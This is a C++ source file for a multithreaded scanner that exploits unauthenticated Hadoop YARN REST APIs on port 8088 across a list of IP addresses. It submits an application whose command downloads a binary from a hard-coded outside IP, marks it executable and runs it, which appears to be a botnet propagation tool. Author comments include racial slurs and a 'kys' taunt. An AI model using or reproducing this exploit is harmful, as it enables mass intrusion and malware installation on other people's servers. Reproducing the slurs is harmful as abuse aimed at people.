#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <queue>
#include <algorithm>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <pthread.h>
#include <unistd.h>
#include <stdarg.h>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#endif

struct ThreadData {
    std::queue<std::string>* q;
    pthread_mutex_t* mutex;
    pthread_cond_t* cond;
    bool* done;
    int* count;
};
//made by frostedflakes666 nigger kys
//we make fun shit out here nigga ong

std::queue<std::string> q;
pthread_mutex_t cout_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t q_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t cv = PTHREAD_COND_INITIALIZER;
bool done_adding = false;
int queue_count = 0;
const char* cmd = "cd /tmp && rm -rf x86 && wget http://213.209.143.44/x86 && chmod +x x86 && ./x86 yarn";

void print_lock(const char* fmt, ...) {
    pthread_mutex_lock(&cout_mutex);
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    fflush(stdout);
    pthread_mutex_unlock(&cout_mutex);
}

void* worker_thread(void* arg) {
    ThreadData* data = (ThreadData*)arg;
    
    while (1) {
        pthread_mutex_lock(data->mutex);
        while (data->q->empty() && !*data->done) {
            pthread_cond_wait(data->cond, data->mutex);
        }
        if (data->q->empty() && *data->done) break;
        
        std::string host = data->q->front();
        data->q->pop();
        pthread_mutex_unlock(data->mutex);
        
        // Simple HTTP exploit
        char url1[1024];
        snprintf(url1, sizeof(url1), "curl -s http://%s:8088/ws/v1/cluster/apps/new-application", host.c_str());
        
        FILE* fp = popen(url1, "r");
        char app_id[256] = {0};
        if (fp) {
            fgets(app_id, sizeof(app_id), fp);
            pclose(fp);
            
            if (strstr(app_id, "\"application-id\"")) {
                // Extract app_id (simple parsing)
                char* start = strstr(app_id, ":\"") + 2;
                char* end = strchr(start, '"');
                if (end) *end = 0;
                
                char payload[2048];
                snprintf(payload, sizeof(payload), 
                    "curl -s -X POST -H \"Content-Type: application/json\" -d '{\"application-id\":\"%s\",\"application-name\":\"get-shell\",\"am-container-spec\":{\"commands\":{\"command\":\"%s\"}},\"application-type\":\"YARN\"}}' http://%s:8088/ws/v1/cluster/apps >/dev/null 2>&1 || true", 
                    start, cmd, host.c_str());
                
                system(payload);
                print_lock("[] - %s\n", host.c_str());
            }
        }
    }
    pthread_mutex_unlock(data->mutex);
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <ips_file>\n", argv[0]);
        return 1;
    }
    
    std::ifstream file(argv[1]);
    std::string line;
    while (std::getline(file, line)) {
        if (!line.empty()) {
            pthread_mutex_lock(&q_mutex);
            q.push(line);
            queue_count++;
            print_lock("\r[%d] Added to queue", queue_count);
            pthread_mutex_unlock(&q_mutex);
        }
    }
    print_lock("\n");
    
    ThreadData data = {&q, &q_mutex, &cv, &done_adding, &queue_count};
    
    pthread_t threads[256];
    int num_threads = std::min(100, queue_count);
    
    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, worker_thread, &data);
    }
    
    usleep(100000); // 100ms
    pthread_mutex_lock(&q_mutex);
    done_adding = true;
    pthread_mutex_unlock(&q_mutex);
    pthread_cond_broadcast(&cv);
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_mutex_destroy(&cout_mutex);
    pthread_mutex_destroy(&q_mutex);
    pthread_cond_destroy(&cv);
    return 0;
}